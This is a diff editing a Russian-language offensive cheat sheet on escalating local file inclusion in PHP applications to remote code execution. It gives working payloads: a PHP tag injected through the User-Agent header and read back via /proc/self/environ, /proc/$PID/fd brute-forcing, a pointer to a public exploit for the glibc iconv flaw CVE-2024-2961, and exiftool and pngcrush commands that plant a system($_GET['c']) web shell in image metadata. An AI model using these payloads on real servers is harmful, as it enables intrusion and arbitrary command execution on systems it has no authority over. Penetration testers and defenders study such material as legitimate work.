@@ -20,41 +20,51 @@
 
 1. Загрузи множество шеллов (например: 100)
 2. Включи ```/proc/$PID/fd/$FD```, где $PID - идентификатор процесса, а $FD - файловый дескриптор. Оба можно подобрать брутфорсом.
+
 ```python
 http://example.com/index.php?page=/proc/$PID/fd/$FD
 ```
 
 # LFI в RCE через /proc/self/environ
 
-Как и с лог-файлом, отправьте полезную нагрузку в заголовке User-Agent, она отразится в файле /proc/self/environ
+* Как и с лог-файлом, отправь полезную нагрузку в заголовке User-Agent, она отразится в файле /proc/self/environ
+
 ```python
 GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
 User-Agent: <?=phpinfo(); ?>
 ```
+
 # LFI в RCE через iconv
 
-Используйте обертку iconv для запуска OOB в glibc (CVE-2024-2961), затем используйте LFI для чтения областей памяти из /proc/self/maps и загрузки бинарного файла glibc. В итоге вы получаете RCE, эксплуатируя структуру zend_mm_heap для вызова free(), который был переназначен на system с использованием custom_heap._free.
+* Используй обертку iconv для запуска OOB в glibc (CVE-2024-2961), затем используйте LFI для чтения областей памяти из /proc/self/maps и загрузки бинарного файла glibc. В итоге вы получаете RCE, эксплуатируя структуру zend_mm_heap для вызова free(), который был переназначен на system с использованием custom_heap._free.
 
-Требования:
+> **iconv** - это системная библиотека для конвертации текста между разными кодировками (например, UTF-8 → Windows-1251). В PHP есть враппер convert.iconv, который позволяет использовать эту библиотеку через PHP-фильтры.
 
-    PHP 7.0.0 (2015) до 8.3.7 (2024)
+**Требования:**
 
-    GNU C Library (glibc) <= 2.39
+1. PHP 7.0.0 (2015) до 8.3.7 (2024)
+2. GNU C Library (glibc) <= 2.39
+3. Доступ к фильтрам convert.iconv, zlib.inflate, dechunk
 
-    Доступ к фильтрам convert.iconv, zlib.inflate, dechunk
+**Exploit:**
 
-Эксплойт:
-
-    ambionics/cnext-exploits
+* [ambionics/cnext-exploits](https://github.com/ambionics/cnext-exploits/tree/main)
 
 # LFI в RCE через загрузку файлов
 
-Если вы можете загрузить файл, просто внедрите шелл-полезную нагрузку в него (например: <?php system($_GET['c']); ?>).
-text
+* Если можно загрузить файл, просто внедри шелл в него (например: <?php system($_GET['c']); ?>).
 
-http://example.com/index.php?page=path/to/uploaded/file.png
+```python
+http://example.com/index.php?page=path/to/uploaded/file.png&c=id
+```
+```python
+Для JPEG:
+exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
 
-Чтобы файл оставался читаемым, лучше всего внедрять в метаданные изображений/doc/pdf.
+Для PNG:
+pngcrush -text a "Comment" "<?php system($_GET['c']); ?>" original.png infected.png
+```
+* Чтобы файл оставался читаемым, лучше всего внедрять в метаданные pictures/doc/pdf.
 
 # LFI в RCE через raceCondition
 
